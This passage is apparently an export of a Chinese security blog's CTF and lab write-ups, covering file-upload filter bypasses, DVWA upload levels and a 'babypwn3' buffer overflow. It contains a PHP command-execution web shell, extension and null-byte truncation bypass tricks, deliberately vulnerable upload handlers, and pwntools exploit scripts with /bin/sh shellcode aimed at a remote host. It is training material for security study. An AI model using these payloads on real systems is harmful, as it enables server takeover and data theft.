<p>文件上传漏洞检测<br>    1.客户端javascript检测（通常在本地检测文件的扩展名）<br>    绕过：<br>        ①禁用js<br>        ②先把文件改成符合条件的文件格式上传，再在抓包，修改文件的后缀名<br>    2.服务端检测绕过（MIME类型检测）<br>    绕过：<br>        可以通过burp拦包，将原Content-Type类型改成符合的类型。<br>    3.服务端目录路径检测<br>    绕过：<br>        上传时提供存储路径为image/20160704/可以修改为image/20160704/evil.php%00来截断。<br>        后端程序会将连接为image/20160704/evil.php%00filename.gif00截断导致最终存储为evil.php<br>    4.服务端文件扩展名检测<br>    （1）黑名单检测：接收上传的文件做对比，如果匹配到黑名单中的后缀名，则不允许上传<br>    绕过：<br>        ①后缀名大小写绕过 ,例如:将Burpsuite截获的数据包中的文件名evil.php改evil.Php<br>        ②名单列表绕过，尝试使用非黑名单内的后缀名，如php5，php7等<br>        ③特殊文件名绕过（只适用windows，将文件名改为evil.php.或    evil.php (注意这里有一个空格)。<br>        在windows下，不允许这样的命名，所以会将.和空格自动去掉）。<br>        ④0x00截断绕过：在上传的时候，当文件系统读到0x00时，会认为文件已经结束。<br>        例如：1.php%00.jpg，验证扩展名是.jpg，但写入的时候是1.php文件。<br>    （2）白名单检测：接收上传的文件做扩展名匹配，匹配上白名单中的扩展名才能上传<br>    绕过：<br>        ①0x00截断绕过<br>        ②解析漏洞绕过<br>        apache解析文件名是从右到左识别扩展名，如eval.php.jpg，文件为php文件，不能解析jpg会向前解析php<br>        IIS6.0 目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析。<br>        IIS6.0不解析;后面的，所以提交evil.asp;.html解析为asp类型<br>        Nginx解析漏洞：将php文件换成其他可以通过的文件后缀，访问的时候在后面加上/.php，<br>        例如：evil.jpg/.php，evil.jpg会解析为php的格式<br>    5.服务端文件内容检测<br>    图像类的文件内容检测<br>        文件幻数检测（图片头格式检测）<br>        jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46<br>        gif内容头value= 47 49 46 38 39 61<br>        png内容头value= 89 50 4E 47<br>    绕过：在文件头后加上一句话木马就能绕过<br>        <img src="/2018/07/07/文件上传绕过/png图.png" alt=""></p>
<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">//基于MIME</span><br><span class="line">&lt;?php  </span><br><span class="line">	if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line">        $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">        $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">        $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">        $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type’];</span><br><span class="line">	//得到上传文件名的类型，kali里可以用mimetype 文件名来查看</span><br><span class="line">	//例如：mimetype 1.php	9527.php: application/x-php(php类型)</span><br><span class="line">	//尽管后缀名改了还是能识别真正的类型（根据内容来检测）</span><br><span class="line">        $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;]; </span><br><span class="line">	//得到文件的大小</span><br><span class="line">	 if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</span><br><span class="line">	//这里做文件类型和文件大小的比较</span><br><span class="line">	//文件大小被规定为100000KB，因此参照LOW抓包改文件最大值不能绕过</span><br><span class="line">	 if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path))&#123;</span><br><span class="line">		echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">           echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">           echo &apos;&lt;/pre&gt;&apos;;  &#125; </span><br><span class="line">	else &#123;</span><br><span class="line">           echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">           echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">           echo &apos;&lt;/pre&gt;&apos;;  &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">           echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; </span><br><span class="line">		&#125; </span><br><span class="line">	&#125;   </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//基于黑名单</span><br><span class="line">&lt;?php</span><br><span class="line">	$BlackList = array(&apos;asp&apos;,&apos;php&apos;,&apos;jsp&apos;,&apos;php5&apos;,&apos;asa&apos;,&apos;aspx’);</span><br><span class="line">	//黑名单</span><br><span class="line">	if (isset($_POST[&quot;submit&quot;]))&#123;</span><br><span class="line">	$name = $_FILES[&apos;file&apos;][&apos;name&apos;]; //接收文件名</span><br><span class="line">	echo $name;</span><br><span class="line">	$extension = substr(strrchr($name,&quot;.&quot;),1);</span><br><span class="line">	//得到扩展名</span><br><span class="line">	$boo = false;		</span><br><span class="line">	foreach ($BlackList as $key=&gt;$value)&#123;</span><br><span class="line">	//foreach()函数的意思是BlackList的键值赋值给value</span><br><span class="line">	//相当于value=BlackList[i]，key=i(数组下标)</span><br><span class="line">       if ($value==$extension)&#123;</span><br><span class="line">	//迭代判断是否有命中</span><br><span class="line">		$boo=true;</span><br><span class="line">		break;//命中之后直接退出循环</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if(!$boo)&#123;</span><br><span class="line">	//如果没有命中，则开始文件上传操作</span><br><span class="line">		$size=$_FILES[&apos;file&apos;][&apos;size’];</span><br><span class="line">		//接收文件大小		</span><br><span class="line">		$tmp=$_FILES[&apos;file&apos;][&apos;tmp_name’];</span><br><span class="line">		//临时路径</span><br><span class="line">		move_uploaded_file($tmp,$name);</span><br><span class="line">		//移动临时文件到当前文件目录</span><br><span class="line">		echo &quot;文件上传成功！&lt;br/&gt; path:&quot;.$name;</span><br><span class="line">		&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		echo &quot;文件不合法！！&quot;;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">///基于白名单</span><br><span class="line">&lt;?php</span><br><span class="line">	$WhiteList=array(&apos;rar&apos;,&apos;jpg&apos;,&apos;png&apos;,&apos;bmp&apos;,&apos;gif&apos;,&apos;jpg&apos;,&apos;doc’);</span><br><span class="line">	if (isset($_POST[&quot;submit&quot;]))&#123;</span><br><span class="line">		$name = $_FILES[&apos;file&apos;][&apos;name’]; </span><br><span class="line">		//接收文件名</span><br><span class="line">		$extension = substr(strrchr($name,&quot;.&quot;),1);</span><br><span class="line">		//得到扩展名</span><br><span class="line">		$boo = false;</span><br><span class="line">	</span><br><span class="line">		foreach ($WhiteList as $key=&gt;$value)&#123;</span><br><span class="line">			if ($value==$extension)&#123;</span><br><span class="line">			//迭代判断是否有命中</span><br><span class="line">			$boo=true;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		if($boo)&#123;</span><br><span class="line">		//如果有命中，则开始文件上传操作</span><br><span class="line">			$size=$_FILES[&apos;file&apos;][&apos;size’];</span><br><span class="line">			//接收文件大小</span><br><span class="line">			$tmp=$_FILES[&apos;file&apos;][&apos;tmp_name’];</span><br><span class="line">			//临时路径</span><br><span class="line">			move_uploaded_file($tmp,$name);</span><br><span class="line">			//移动临时文件到当前文件目录</span><br><span class="line">			echo &quot;文件上传成功！&lt;br/&gt; path:&quot;.$name;</span><br><span class="line">			&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			echo &quot;文件不合法！！&quot;;</span><br><span class="line">			&#125;		</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[实验吧上传绕过]]></title>
      <url>/2018/07/07/%E5%AE%9E%E9%AA%8C%E5%90%A7%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;</p>
<p>解题链接：<a href="http://ctf5.shiyanbar.com/web/upload/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/upload/</a><br>①因为没有说明上传文件的类型，因此先上传一个.png文件<br><img src="/2018/07/07/实验吧上传绕过/01.png" alt=""><br>结果显示的页面说必须上传成后缀名为php的文件，还说了存储的路径./upload/<br><img src="/2018/07/07/实验吧上传绕过/02.png" alt=""><br>②接着上传一个.php文件，结果显示仅支持上传jpg,gif,png文件<br><img src="/2018/07/07/实验吧上传绕过/03.png" alt=""><br>这一题是先检测后缀名的，需要jpg的格式，但是存储的时候把名字给改了。最后的一句提示是需要上传成文件后缀名为php的，这个php格式的后缀名和检测的jpg格式矛盾了，用%00截断<br>③还是上传php文件，然后抓包，把文件后缀名改成.php，还要%00截断<br><img src="/2018/07/07/实验吧上传绕过/04.png" alt=""><br>然后在Repeater里面，在上传的路径的upload后加上相应的php文件名，在加几个空格做标记，在用hex查看标记，在第一个20改成00做截断<br><img src="/2018/07/07/实验吧上传绕过/05.png" alt=""><br>返回到Repeater的Raw的页面，可以发现已经被截断了<br><img src="/2018/07/07/实验吧上传绕过/06.png" alt=""><br>点GO以后可以看到flag<br><img src="/2018/07/07/实验吧上传绕过/07.png" alt=""></p>
<p>flag：flag{SimCTF_huachuan}</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DVWA文件上传]]></title>
      <url>/2018/07/07/DVWA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;</p>
<p>上传的php文件内容：&lt;?php echo shell_exec($_GET[‘a’]);?&gt;</p>
<p>LOW等级源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line">       $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">		//上传的路径为../../ hackable/uploads/</span><br><span class="line">       $target_path = $target_path . basename( $_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">		//上传路径加上上传的文件名</span><br><span class="line">     if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;</span><br><span class="line">       //这里只做是否上传成功的判断，因此所有格式的文件都能上传         </span><br><span class="line">                echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">       &#125; </span><br><span class="line">else &#123;</span><br><span class="line">                echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                echo &apos;&lt;/pre&gt;&apos;;             </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>①第一次上传图片时没有看源码，符合要求但是显示不能成功上传<br>（可能存在的原因是图片文件太大）</p>
<p><img src="/2018/07/07/DVWA文件上传/01.png" alt=""></p>
<p>抓包发现是因为超出了上传文件的最大内容<br>解决：可以在抓到的头部把最大值改了，可以上传（在服务器端没有对文件大小做验证）</p>
<p>②通过看源码发现对上传文件格式没有任何限制，因此直接上传一个 .php文件<br>上传成功后输入相应的url并写入参数.<br>例如：192.168.1.208/dvwa/hackable/uploads/9527.php?a=pwd，可以查看所在目录</p>
<p><img src="/2018/07/07/DVWA文件上传/02.png" alt=""></p>
<p>MEDIUM等级源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line">         $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">         $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">         $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">         $uploaded_type = $_FILES[&apos;uploaded&apos;][&apos;type&apos;];</span><br><span class="line">		//得到上传文件名的类型，kali里可以用mimetype 文件名来查看</span><br><span class="line">		//例如：mimetype 1.php	9527.php: application/x-php(php类型)</span><br><span class="line">		//尽管后缀名改了还是能识别真正的类型（根据内容来检测）</span><br><span class="line">         $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];</span><br><span class="line">		 //得到文件的大小</span><br><span class="line"></span><br><span class="line">     if (($uploaded_type == &quot;image/jpeg&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</span><br><span class="line">		//这里做文件类型和文件大小的比较</span><br><span class="line">		//文件大小被规定为100000KB，因此参照LOW抓包改文件最大值不能绕过</span><br><span class="line"> 	if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;</span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;  &#125; </span><br><span class="line">		else &#123;</span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;  </span><br><span class="line">			&#125;</span><br><span class="line">       &#125;</span><br><span class="line">	else&#123;</span><br><span class="line">                echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>①对于MIME类型的验证，可以通过抓包修改Content-type的值<br>将Content-type的值application/x-php改成image/jpeg</p>
<p><img src="/2018/07/07/DVWA文件上传/03.png" alt=""></p>
<p>显示上传成功</p>
<p><img src="/2018/07/07/DVWA文件上传/04.png" alt=""></p>
<p>②输入url并填入参数<br>例如：输入url：192.168.1.208/dvwa/hackable/uploads/9527.php?a=ls查看当前文件夹下的文件</p>
<p><img src="/2018/07/07/DVWA文件上传/05.png" alt=""></p>
<p>*常见的MIME类型</p>
<p><img src="/2018/07/07/DVWA文件上传/06.png" alt=""></p>
<p>*可以用mimetype文件名来查看文件类型<br>mimetype是用内容的前10个字节来判断文件类型，因此更改后缀名不能更改文件类型</p>
<p><img src="/2018/07/07/DVWA文件上传/07.png" alt=""></p>
<p>HIGH等级源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if (isset($_POST[&apos;Upload&apos;])) &#123;</span><br><span class="line">       $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;</span><br><span class="line">       $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);</span><br><span class="line">       $uploaded_name = $_FILES[&apos;uploaded&apos;][&apos;name&apos;];</span><br><span class="line">       $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &apos;.&apos;) + 1);</span><br><span class="line">		//读取文件上传的扩展名</span><br><span class="line">       $uploaded_size = $_FILES[&apos;uploaded&apos;][&apos;size&apos;];</span><br><span class="line">	if (($uploaded_ext == &quot;jpg&quot; || $uploaded_ext == &quot;JPG&quot; || $uploaded_ext == &quot;jpeg&quot; || </span><br><span class="line">	$uploaded_ext == &quot;JPEG&quot;) &amp;&amp; ($uploaded_size &lt; 100000))&#123;</span><br><span class="line">		//对读取的文件扩展名进行判断类型和文件大小判断</span><br><span class="line">		if(!move_uploaded_file($_FILES[&apos;uploaded&apos;][&apos;tmp_name&apos;], $target_path)) &#123;  </span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;;  </span><br><span class="line">					&#125; </span><br><span class="line">			else &#123;</span><br><span class="line">                    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                    echo $target_path . &apos; succesfully uploaded!&apos;;</span><br><span class="line">                    echo &apos;&lt;/pre&gt;&apos;; </span><br><span class="line">					&#125;</span><br><span class="line">            &#125;</span><br><span class="line">		else&#123; </span><br><span class="line">                echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">                echo &apos;Your image was not uploaded.&apos;;</span><br><span class="line">                echo &apos;&lt;/pre&gt;&apos;;  </span><br><span class="line">				&#125;</span><br><span class="line">	&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>①抓包，在后缀名后在添加上相应的图片后缀名，此处可以将9527.php改成9527.php.jpg</p>
<p><img src="/2018/07/07/DVWA文件上传/08.png" alt=""></p>
<p>显示上传成功</p>
<p><img src="/2018/07/07/DVWA文件上传/09.png" alt=""></p>
<p>②输入相应的URL，并填入参数得到结果<br>例如：输入url：192.168.1.208/dvwa/hackable/uploads/9527.php.jpg?a=pwd</p>
<p><img src="/2018/07/07/DVWA文件上传/10.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[babypwn3学习经历]]></title>
      <url>/2017/12/30/babypwn3%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>一:查壳<br>checksec babypwn3<br>显示：</p>
<p><img src="/2017/12/30/babypwn3学习经历/01.png" alt=""></p>
<p>没有什么保护<br>二：代码<br>int vulFunc()<br>{<br>char buf; // [sp+0h] [bp-88h]@1<br>char v2; // [sp+7Fh] [bp-9h]@1<br>memset(&amp;buf, 0, 0x80u); //初始化buf的128个字节为0 ①<br>puts(“寮勬淇轰亢涔熶笉浼氬惉浣犵殑璇濈殑锛乗n”);<br>read(0, &amp;buf, 0x100u); //读取数据256个字节保存在buf中<br>if ( v2 == 127 )<br>JUMPOUT(CS, &amp;buf); //当v2=127时会去执行栈上的代码<br>return puts(“鐣ョ暐鐣ワ綖\n”);<br>}<br>.text:080484A6 ; =============== S U B R O U T I N E =======================================<br>.text:080484A6<br>.text:080484A6 ; Attributes: bp-based frame<br>.text:080484A6<br>.text:080484A6 public vulFunc<br>.text:080484A6 vulFunc proc near ; CODE XREF: main+46p<br>.text:080484A6<br>.text:080484A6 buf = byte ptr -88h<br>.text:080484A6 var_9 = byte ptr -9<br>.text:080484A6<br>……<br>.text:08048500 jmp esp<br>三：<br>需要一个shellcode能够system(“/bin/sh”)<br>shellcode=”\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”; //感恩师傅，我可以偷懒<br>1.shellcode+任意字符*(127-shellcode长度)+(v2=127)<br>覆盖v2=127，需要用p32()打包<br>from pwn import<br>shellcode = “\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”;<br>p=remote(‘121.42.189.18 ‘,7003)<br>payload = shellcode+’a’(127-len(shellcode))+p32(127)<br>p.recv()<br>p.sendline(payload)<br>raw_input()<br>p.interactive()<br>2.”jmp esp”作为跳板动态定位shellcode③<br>因为当Eip在后续执行过程中，遇到了jmp esp指令，仍会回到esp指向的函数形参位置执行，执行shellcode的剩余部分。<br>jmp sep地址=08048500 ，需要用p32()打包<br>from pwn import<br>shellcode = “\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”;<br>p=remote(‘121.42.189.18 ‘,7003)<br>jmp_esp=0x8048500<br>payload = ‘a’140+p32(jmp_esp)+shellcode<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br>四：进入shell里<br>cat /tmp/flag ⑤<br>①memset() 函数常用于内存空间初始化<br>void memset(void s,int c,size_t n)<br>开辟的空间s的n个字符初始化为c<br>②JumpOut (“Program” [, “Document”])<br>program:指定的应用程序打开文件Document<br>③可用”jmp esp”作为跳板动态定位shellcode<br>1) 用内存中任意一个”jmp esp”的地址覆盖返回地址<br>2) 函数返回后被重定向去执行内存中jmp esp指令<br>3) 由于函数返回后ESP指向返回地址后，jmp esp执行后，CPU将到栈区函数返回地址之后的地方取指令执行<br>4) shellcode的布置。缓冲区前面一段用任意数据填充，把shellcode放在函数返回地址后面。jmp esp执行完就执行shellcode。<br><a href="http://blog.csdn.net/lixiangminghate/article/details/53333710（栈的图画得非常好）" target="_blank" rel="noopener">http://blog.csdn.net/lixiangminghate/article/details/53333710（栈的图画得非常好）</a><br><a href="http://blog.csdn.net/swjtu100/article/details/50032831（exploit画得很好看）" target="_blank" rel="noopener">http://blog.csdn.net/swjtu100/article/details/50032831（exploit画得很好看）</a><br>栈指针esp的一个特性：当函数执行ret指令后，Eip寄存器发生了跳转，但Esp还指向函数形参在栈中的地址。<br>当Eip在后续执行过程中，遇到了jmp esp指令，仍会回到esp指向的函数形参位置执行，执行shellcode的剩余部分。<br>④flag{g54dwqdqw-f43csad-saDWqd23wdasxsaxdFDWEVC}</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[俄罗斯方块（GG）]]></title>
      <url>/2017/12/30/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%EF%BC%88GG%EF%BC%89/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>①查看元素<br>有一个tetris.js的文件<br>②在线代码美化<br>根据题目分数大于1000000分<br>偷懒查找score</p>
<p><img src="/2017/12/30/俄罗斯方块（GG）/01.png" alt=""><br>③发现有个 “webqwer” [1] + “100.js”<br>webqwer[1]就是e<br>④<a href="http://218.76.35.75:65380/e100.js" target="_blank" rel="noopener">http://218.76.35.75:65380/e100.js</a><br>又是[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]这种代码<br>⑤在控制台复制粘贴加执行<br>跳出对话框，里面有flag</p>
<p><img src="/2017/12/30/俄罗斯方块（GG）/02.png" alt=""></p>
<p>flag{oT0yTrjU0xhjhj2YTcT8jljMWpzS9tDk}</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[南邮综合题]]></title>
      <url>/2017/12/30/%E5%8D%97%E9%82%AE%E7%BB%BC%E5%90%88%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>1、打开网页是 jother编码 </p>
<p><img src="/2017/12/30/南邮综合题/01.png" alt=""></p>
<p>*jother编码：JavaScript是一种属于网络的脚本语言,已经被广泛用于Web应用开发,常用来为网页添加各式各样的动态功能,为用户提供更流畅美观的浏览效果。<br>通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的jother是另类的javascript工具<br>一堆+!的东西就用jother解码<br>可以打开谷歌浏览器 按F12<br>然后console将那堆解码的东西复制过去 按回车即可解码<br>2、在谷歌浏览器中的console中复制粘贴代码，回车解码<br>得到1bc29b36f623ba82aaf6724fd3b16718.php<br>将<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php</a><br>改成<br><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php</a></p>
<p><img src="/2017/12/30/南邮综合题/02.png" alt=""></p>
<p>显示：哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里<br>(▼へ▼メ)<br>给了提示，要看tip<br>3、当前页面<br><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php</a><br>查看tip（在network里的headers里查看有个history of bash）</p>
<p>*history of bash：默认情况下，历史命令是存储在~/.bash_history文件里</p>
<p><img src="/2017/12/30/南邮综合题/04.png" alt=""></p>
<p>4、找/.bash_histroy文件<br><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a><br>找到一个压缩包zip -r flagbak.zip ./*</p>
<p><img src="/2017/12/30/南邮综合题/05.png" alt=""></p>
<p>用URL=<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a><br>自动下载，下载完解压找到flag<br>flag is:nctf{bash_history_means_what}</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[babyphp]]></title>
      <url>/2017/12/30/babyphp/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>1、查看源码：</p>
<p><img src="/2017/12/30/babyphp/01.png" alt=""></p>
